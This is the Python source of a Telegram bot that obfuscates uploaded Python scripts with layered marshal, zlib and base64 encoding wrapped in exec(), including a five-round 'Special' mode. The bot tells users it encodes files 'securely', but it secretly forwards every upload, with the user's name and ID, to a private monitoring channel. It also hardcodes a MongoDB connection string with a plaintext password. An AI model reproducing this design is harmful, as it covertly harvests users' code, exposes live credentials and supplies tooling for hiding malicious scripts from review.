import os,sys
import time
import time 
import zlib
import base64
import marshal
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from datetime import datetime, timedelta
import logging
from pymongo import MongoClient
import random

admin_id = 6897739611  # Replace with your admin ID
Notification= -1002366008044 #replace with channel id where user notification will be sent 
monitor=-1002258177872 #replace with channel id where all the python files will sent 
force_channel = "join_hyponet"  # Set your channel username here

import os
bot_token = os.getenv("BOT_TOKEN")
if not bot_token:
    raise ValueError("⚠️ BOT_TOKEN environment variable is not set!")
bot = telebot.TeleBot(bot_token)

mongo_url = "mongodb+srv://botplays90:botplays90@botplays.ycka9.mongodb.net/?retryWrites=true&w=majority&appName=botplays"
client = MongoClient(mongo_url)
db = client['telegram_bot']
registered_users = db['registered_users']
muted_users = db['muted_users']

group_id = -1002366008044

app = Flask('')

@app.route('/')
def home():
    return "I am alive"

def run_http_server():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_http_server)
    t.start()


def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(f"@{force_channel}", user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

from telebot.types import Message

def check_membership(func):
    def wrapper(message: Message, *args, **kwargs):
        chat_id = message.chat.id
        if not is_user_joined(chat_id):
            buttons = InlineKeyboardMarkup()
            buttons.add(
                InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{force_channel}"),
                InlineKeyboardButton("✅ I’ve Joined", callback_data="check_joined")
            )
            bot.send_message(
                chat_id,
                "🚨 You must join our channel to use this bot.",
                reply_markup=buttons
            )
            return
        return func(message, *args, **kwargs)
    return wrapper

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def verify_channel_join(call):
    chat_id = call.from_user.id
    if is_user_joined(chat_id):
        bot.answer_callback_query(call.id, "✅ You're verified!")
        bot.send_message(chat_id, "Thanks for joining! You can now use the bot.\n\nType /start to begin.")
    else:
        bot.answer_callback_query(call.id, "❌ You're still not a member!", show_alert=True)





def is_muted(user_id):
    user = muted_users.find_one({"user_id": user_id})
    if user:
        if user['mute_until'] > datetime.now():
            return True
        else:
            muted_users.delete_one({"user_id": user_id})
    return False
    
zlb = lambda in_: zlib.compress(in_)
b16 = lambda in_: base64.b16encode(in_)
b32 = lambda in_: base64.b32encode(in_)
b64 = lambda in_: base64.b64encode(in_)
mar = lambda in_: marshal.dumps(compile(in_, '<x>', 'exec'))

note = (
    "# Obfuscated by the @botplays90 encoder\n #Bot Username@pythonEncoderbybot \n"
    "#Time: %s\n" % time.ctime()
)

def encode_file(option, data, output, loop):
    if option == 1:
        xx = "mar(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('marshal').loads(__[::-1]);"
    elif option == 2:
        xx = "zlb(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
    elif option == 3:
        xx = "b16(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
    elif option == 4:
        xx = "b32(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
    elif option == 5:
        xx = "b64(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
    elif option == 6:
        xx = "base64.b85encode(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b85decode(__[::-1]);"
    elif option == 7:
        xx = "base64.a85encode(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').a85decode(__[::-1]);"
    elif option == 8:
        xx = "data.encode('utf8').hex()[::-1]"
        heading = "_ = lambda __ : bytes.fromhex(__[::-1]);"
    elif option == 9:
        xx = "str(bytes(marshal.dumps(compile(data, '', 'exec'))))[::-1]"
        heading = "_ = lambda __ : eval(__[::-1]);"
    elif option == 10:
        xx = "base64.urlsafe_b64encode(data.encode('utf8'))[::-1]"
        heading = "_ = lambda __ : __import__('base64').urlsafe_b64decode(__[::-1]);"
    elif option == 11:
        xx = "base64.b32encode(zlib.compress(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b32decode(__import__('zlib').decompress(__[::-1]));"
    elif option == 12:
        xx = "base64.b16encode(zlib.compress(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b16decode(__import__('zlib').decompress(__[::-1]));"
    elif option == 13:
        xx = "base64.b85encode(zlib.compress(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('base64').b85decode(__import__('zlib').decompress(__[::-1]));"
    elif option == 14:
        xx = "base64.a85encode(zlib.compress(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('base64').a85decode(__import__('zlib').decompress(__[::-1]));"
    elif option == 15:
        xx = "base64.urlsafe_b64encode(zlib.compress(data.encode('utf8')))[::-1]"
        heading = "_ = lambda __ : __import__('base64').urlsafe_b64decode(__import__('zlib').decompress(__[::-1]));"
    else:
        return None

    for _ in range(loop):
        data = "exec((_)(%s))" % repr(eval(xx))

    with open(output, 'w') as f:
        f.write(note + heading + data)

    return output

def special_encode(data, output):
    for _ in range(5):
        method = repr(b64(zlb(mar(data.encode('utf8'))))[::-1])
        data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method

    z = []
    for i in data:
        z.append(ord(i))
    sata = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z

    with open(output, 'w') as f:
        f.write(note + sata)

    return output

def create_inline_keyboard():
    keyboard = InlineKeyboardMarkup()
    buttons = [
        InlineKeyboardButton("Marshal", callback_data='1'),
        InlineKeyboardButton("Zlib", callback_data='2'),
        InlineKeyboardButton("Base16", callback_data='3'),
        InlineKeyboardButton("Base32", callback_data='4'),
        InlineKeyboardButton("Base64", callback_data='5'),
        InlineKeyboardButton("Base85", callback_data='6'),
        InlineKeyboardButton("A85", callback_data='7'),
        InlineKeyboardButton("Hex", callback_data='8'),
        InlineKeyboardButton("Marshal Hex", callback_data='9'),
        InlineKeyboardButton("URL-safe B64", callback_data='10'),
        InlineKeyboardButton("B32 + Zlib", callback_data='11'),
        InlineKeyboardButton("B16 + Zlib", callback_data='12'),
        InlineKeyboardButton("B85 + Zlib", callback_data='13'),
        InlineKeyboardButton("A85 + Zlib", callback_data='14'),
        InlineKeyboardButton("URL-safe B64 + Zlib", callback_data='15'),
        InlineKeyboardButton("Special", callback_data='16'),
    ]

    for i in range(0, len(buttons), 4):
        keyboard.add(*buttons[i:i + 4])

    return keyboard


def add_owner_button(keyboard):
    owner_button = InlineKeyboardButton("👤 Developer", url="https://t.me/botplays90")
    join_channel_button = InlineKeyboardButton("♻️ Join-Channel", url="https://t.me/join_hyponet")  # Replace with your channel URL
    keyboard.add(owner_button, join_channel_button)
    return keyboard




@bot.message_handler(commands=['register'])
@check_membership
def register_command(message):
    user_id = message.chat.id
    
    # Check if user is already registered
    if registered_users.find_one({"user_id": user_id}):
        bot.reply_to(message, "✅ You are already registered!\nType /encode to start encoding.", reply_markup=add_owner_button(InlineKeyboardMarkup()))
    else:
        # Register the user
        registered_users.insert_one({
            "user_id": user_id,
            "username": message.from_user.username or message.from_user.first_name
        })
        
        # Send user details to the private channel (replace 'your_channel_id' with your private channel ID)
        bot.send_message(
            Notification,  # Replace this with your private channel ID or username
            f"🌐*New user registered:*\n"
            f"👤*User ID:* `{user_id}`\n"
            f"❇️ *Username:* {message.from_user.username or message.from_user.first_name}\n"
            f"♻️*Full Name:* {message.from_user.first_name} {message.from_user.last_name or ''}",parse_mode="MarkDown"
        )
        
        bot.reply_to(message, "🎉 You have successfully registered! Type /encode to start encoding.", reply_markup=add_owner_button(InlineKeyboardMarkup()))

        
@bot.message_handler(commands=['unregister'])
def unregister_command(message):
    user_id = message.chat.id

    # Check if the command is issued by the admin
    if user_id != admin_id:
        bot.reply_to(message, "❌ You don't have permission to use this command.")
        return

    # Split the command to get the target username or user ID
    try:
        command, target = message.text.split(maxsplit=1)
    except ValueError:
        bot.reply_to(message, "❗ Please provide the username or user ID to unregister.")
        return

    # Attempt to convert target to an integer (user ID); if it fails, treat it as a username
    try:
        target_id = int(target)
        query = {"user_id": target_id}
    except ValueError:
        target_username = target.lstrip('@')  # Remove '@' if provided
        query = {"username": target_username}

    # Find the user in the database
    user = registered_users.find_one(query)
    if user:
        # Delete the user from the database
        result = registered_users.delete_one(query)
        if result.deleted_count == 1:
            bot.reply_to(message, f"✅ User {'@' + user.get('username', str(user['user_id']))} has been unregistered.")
        else:
            bot.reply_to(message, "❌ An error occurred while trying to unregister the user.")
    else:
        bot.reply_to(message, "❌ User not found in the registered users database.")




@bot.message_handler(commands=['start'])
@check_membership
def start_command(message):
    user_id = message.chat.id
    
    # Send the user's information to the private channel
    bot.send_message(
        Notification,  # Private channel ID or username
        f"🆕 *New user started the bot:*\n"
        f"👤 *User ID:* `{user_id}`\n"
        f"🔑 *Username:* @{message.from_user.username or message.from_user.first_name}\n"
        f"📝 *Full Name:* {message.from_user.first_name} {message.from_user.last_name or ''}",
        parse_mode="Markdown"
    )

    if is_muted(user_id):
        bot.reply_to(message, "⏳ You are currently muted. Please try again later.")
        return
    
    if registered_users.find_one({"user_id": user_id}):
        bot.send_message(user_id, "Welcome back! 🎉 You’re all set to encode your files.\n\n"
                         "Just use the /encode command to get started. \n\n"
                         "If you need any help, feel free to ask!\n",
                         reply_markup=add_owner_button(InlineKeyboardMarkup()))
    else:
        welcome_text = (
            "🎉 *Welcome to the Botplays Encoder Bot!* 🎉\n\n"
            "*This bot allows you to securely encode your files using multiple encoding methods.*\n\n"
            "To get started, please register by typing /register.\n\n"
            "After registration, type /encode and send the file you want to encode\n "
            "You can select from various encoding options.\n"
        )
        bot.send_message(user_id, welcome_text, reply_markup=add_owner_button(InlineKeyboardMarkup()))



@bot.message_handler(commands=['broad'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_member = bot.get_chat_member(group_id, user_id)

    # Check if the user is an admin or creator
    if chat_member.status in ['administrator', 'creator']:
        # Extract the message content (after the command)
        broadcast_text = message.text[len("/broad "):].strip()

        # Check if there's any text after the command
        if not broadcast_text:
            bot.reply_to(message, "🚫 Please provide a message to broadcast.")
            return

        user_count = registered_users.count_documents({})
        if user_count == 0:
            bot.reply_to(message, "🚫 No registered users found to send the broadcast.")
            return

        # Prepare to send the broadcast message to all users
        sent_count = 0
        failed_count = 0
        failed_users = []

        # Send the broadcast message to all registered users
        user_list = registered_users.find()
        for user in user_list:
            user_id = user.get("user_id")
            try:
                bot.send_message(user_id, broadcast_text)
                sent_count += 1
            except Exception as e:
                failed_count += 1
                failed_users.append(user_id)

        # Send a summary message after broadcasting
        summary_message = f"📢 *Broadcast Summary*:\n"
        summary_message += f"✅ *Successfully sent to {sent_count} users.*\n"
        summary_message += f"❌ *Failed to send to {failed_count} users.*\n"


        bot.send_message(message.chat.id, summary_message, parse_mode="Markdown")

    else:
        bot.reply_to(message, "❌ *You do not have permission* to use this command.")



@bot.message_handler(commands=['users'])
def show_users(message):
    user_id = message.from_user.id
    chat_member = bot.get_chat_member(group_id, user_id)

    # Check if the user is an admin or creator
    if chat_member.status in ['administrator', 'creator']:
        user_count = registered_users.count_documents({})

        if user_count == 0:
            bot.reply_to(message, "🚫 No registered users found.")
            return

        # Building the user message
        user_message = "👥 *Registered Users*: \n\n"
        user_list = registered_users.find()

        users = []
        for user in user_list:
            username = user.get("username", "Unknown")
            user_id = user.get("user_id")
            tags = user.get("tags", "No tags")  # Assuming tags are stored in the DB

            # Format each user with their username, user_id, and tags
            users.append(f"🔹 *{username}* - `{user_id}`\n\n")

        chunk_size = 15
        chunks = [users[i:i + chunk_size] for i in range(0, len(users), chunk_size)]
        for i, chunk in enumerate(chunks):
            chunk_message = user_message + ''.join(chunk) 
            if i > 0:
                chunk_message = f"📄 *Part {i + 1}:* \n\n" + chunk_message  
            
            # Send the chunk to the chat
            bot.send_message(message.chat.id, chunk_message, parse_mode="Markdown")

    else:
        bot.reply_to(message, "❌ *You do not have permission* to use this command.")


user_last_encode_time = {}

@bot.message_handler(commands=['encode'])
@check_membership
def encode_command(message):
    user_id = message.chat.id

    if is_muted(user_id):
        bot.reply_to(message, "⏳ You are currently muted. Please try again later.")
        return

    # Skip timeout check for admins
    chat_member = bot.get_chat_member(group_id, user_id)
    if chat_member.status in ['administrator', 'creator']:
        bot.reply_to(message, "❇️ Please send the file you want to encode.",
                     reply_markup=add_owner_button(InlineKeyboardMarkup()))
        return

    if not registered_users.find_one({"user_id": user_id}):
        bot.reply_to(message, "❗ Please register using /register before encoding.",
                     reply_markup=add_owner_button(InlineKeyboardMarkup()))
        return

    current_time = time.time()
    if user_id in user_last_encode_time:
        time_diff = current_time - user_last_encode_time[user_id]
        if time_diff < 120:
            remaining_time = 120 - time_diff
            bot.reply_to(message, f"⏳ You need to wait {int(remaining_time)} seconds before encoding another file.")
            return

    bot.reply_to(message, "Please send the file you want to encode.", reply_markup=add_owner_button(InlineKeyboardMarkup()))

@bot.message_handler(commands=['unmute'])
def unmute_command(message):
    user_id = message.from_user.id
    chat_member = bot.get_chat_member(group_id, user_id)

    if chat_member.status not in ['administrator', 'creator']:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    muted_user_list = muted_users.find()
    if muted_users.count_documents({}) == 0:
        bot.reply_to(message, "No muted users found.")
        return

    keyboard = InlineKeyboardMarkup()
    for user in muted_user_list:
        username = user.get("username", "Unknown")
        user_id = user["user_id"]
        keyboard.add(InlineKeyboardButton(f"{username} - Unmute", callback_data=f"unmute_{user_id}"))

    bot.send_message(message.chat.id, "Select a user to unmute:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("unmute_"))
def handle_unmute_callback(call):
    try:
        user_id = int(call.data.split("_")[1])

        muted_users.delete_one({"user_id": user_id})
        bot.answer_callback_query(call.id, f"User {user_id} has been unmuted.")
        bot.send_message(call.message.chat.id, f"✅ User {user_id} has been successfully unmuted.")
        
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("mute_"))
def handle_mute_callback(call):
    try:
        _, user_id, hours = call.data.split("_")
        user_id = int(user_id)
        hours = int(hours)
        
        username = bot.get_chat_member(group_id, user_id).user.username or "Unknown"
        mute_until = datetime.now() + timedelta(hours=hours)
        
        # Update the muted_users collection with both user_id and username
        muted_users.update_one(
            {"user_id": user_id},
            {"$set": {"mute_until": mute_until, "username": username}},
            upsert=True
        )
        
        bot.answer_callback_query(call.id, f"User {username} muted for {hours} hours.")
        
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}")

@bot.message_handler(commands=['mute'])
def mute_user(message):
    admin_id = message.from_user.id
    if bot.get_chat_member(group_id, admin_id).status not in ['administrator', 'creator']:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    try:
        user_id = int(message.text.split()[1])
        # Send mute options with inline buttons
        bot.send_message(message.chat.id, "Select mute duration:",
                         reply_markup=create_mute_duration_keyboard(user_id))
    except IndexError:
        bot.reply_to(message, "❌ Usage: /mute <user_id>")

# Inline keyboard for mute durations
def create_mute_duration_keyboard(user_id):
    keyboard = InlineKeyboardMarkup()
    # Define mute options: [(label, duration in hours)]
    mute_options = [
        ("1 Hour", 1),
        ("6 Hours", 6),
        ("1 Day", 24),
        ("3 Days", 72),
        ("1 Week", 168)
    ]
    # Create a button for each duration
    for label, hours in mute_options:
        keyboard.add(InlineKeyboardButton(label, callback_data=f"mute_{user_id}_{hours}"))
    return keyboard

# Callback handler for mute button selection
@bot.callback_query_handler(func=lambda call: call.data.startswith("mute_"))
def handle_mute_callback(call):
    try:
        # Parse user_id and duration from callback data
        _, user_id, hours = call.data.split("_")
        user_id = int(user_id)
        hours = int(hours)
        
        # Calculate mute expiration time
        mute_until = datetime.now() + timedelta(hours=hours)
        muted_users.update_one(
            {"user_id": user_id},
            {"$set": {"mute_until": mute_until}},
            upsert=True
        )
        bot.answer_callback_query(call.id, f"User {user_id} muted for {hours} hours.")
    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {str(e)}")
                     
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.chat.id

    if is_muted(user_id):
        bot.reply_to(message, "⏳ You are currently muted. Please try again later.")
        return

    if not registered_users.find_one({"user_id": user_id}):
        bot.reply_to(message, "❗ Please register using /register before uploading files.", 
                     reply_markup=add_owner_button(InlineKeyboardMarkup()))
        return

    # Apply cooldown check here too
    current_time = time.time()
    if user_id in user_last_encode_time:
        time_diff = current_time - user_last_encode_time[user_id]
        if time_diff < 120:
            remaining_time = 120 - time_diff
            bot.reply_to(message, f"⏳ You need to wait {int(remaining_time)} seconds before encoding another file.")
            return


    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    temp_file_name = message.document.file_name
    with open(temp_file_name, 'wb') as temp_file:
        temp_file.write(downloaded_file)

    # Send the file to the private channel with the caption
    channel_id = monitor # Replace with your private channel username or ID
    caption = f"🌐*New document uploaded by {message.from_user.first_name} *\n" \
              f"❇️*Username:* @{message.from_user.username}\n" \
              f"*👤User ID*: `{user_id}`"

    bot.send_document(channel_id, open(temp_file_name, 'rb'), caption=caption, parse_mode='Markdown')

    bot.reply_to(message, "❇️File received\n👤 Please choose an encoding method:", 
                 reply_markup=create_inline_keyboard())

    # Ensure to close the file after sending
    temp_file.close()



# This is where the callback query handler will handle user interactions
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        option = int(call.data)
        
        # Check if the user is replying to a message with a document
        if call.message.reply_to_message and call.message.reply_to_message.document:
            file_name = call.message.reply_to_message.document.file_name
            
            # Download and open the file
            file_info = bot.get_file(call.message.reply_to_message.document.file_id)
            file = bot.download_file(file_info.file_path)
            
            data = file.decode('utf-8')  # Assuming it's a text file
            
            # Define output filename
            output = file_name.lower().replace('.py', '') + '_enc.py'
            loop = 1

            # Determine encoding option
            if option == 16:
                output = special_encode(data, output)
            else:
                output = encode_file(option, data, output, loop)

            # Send the encoded file if available
            if output:
                with open(output, 'rb') as enc_file:
                    bot.send_document(call.message.chat.id, enc_file)
                os.remove(output)  # Clean up after sending the file

                # Store the last encoding time
                user_last_encode_time[call.message.chat.id] = time.time()

                # Send a follow-up message encouraging the user to encode again
                bot.send_message(call.message.chat.id, 
                                 "✅ *Encoding completed successfully!\n\n You can encode another file by sending it here,\n\nor use the /encode command again for a new encoding session.*",parse_mode="MarkDown")

            else:
                bot.reply_to(call.message, "Invalid encoding option selected.")

            os.remove(file_name)
        else:
            bot.reply_to(call.message, "⚠️ No file was uploaded for encoding. Please attach a file and try again! 📄")

    except Exception as e:
        # Handle any errors that occur during the callback
        bot.reply_to(call.message, f"Error: {str(e)}")
        time.sleep(5)
        restart_bot(call.message.chat.id)  # Pass chat ID for messaging during restart

def restart_bot(chat_id):
    """Restart the bot."""
    bot.send_message(chat_id, "🚀 Restarting the bot... Please wait!")

    # Restart the bot by re-running the script using the same executable and arguments
    os.execv(sys.executable, ['python'] + sys.argv)

@bot.message_handler(func=lambda message: True)
def handle_invalid_message(message):
    """Handle non-command and non-document messages."""
    # Check if the message contains a document or is a command
    if not message.document and not message.text.startswith('/'):
        # If it's not a document and not a command, prompt the user to send a valid document
        bot.reply_to(message, "⚠️ Please send a valid document to encode")


@bot.message_handler(commands=['stats'])
def stats_command(message):
    try:
        user_id = message.chat.id
        chat_member = bot.get_chat_member(group_id, user_id)
        
        # Check if the user is an admin or creator
        if chat_member.status not in ['administrator', 'creator']:
            bot.reply_to(message, "❌ *You don't have permission to use this command.*", parse_mode="Markdown")
            return
        
        total_users = registered_users.count_documents({})
        bot.reply_to(message, f"📊 *Bot Stats*\n\n👥 *Total Registered Users:* `{total_users}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"⚠️ *Error:* {str(e)}", parse_mode="Markdown")



if __name__ == "__main__":
    keep_alive()
    
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error occurred: {str(e)}")
            time.sleep(5)
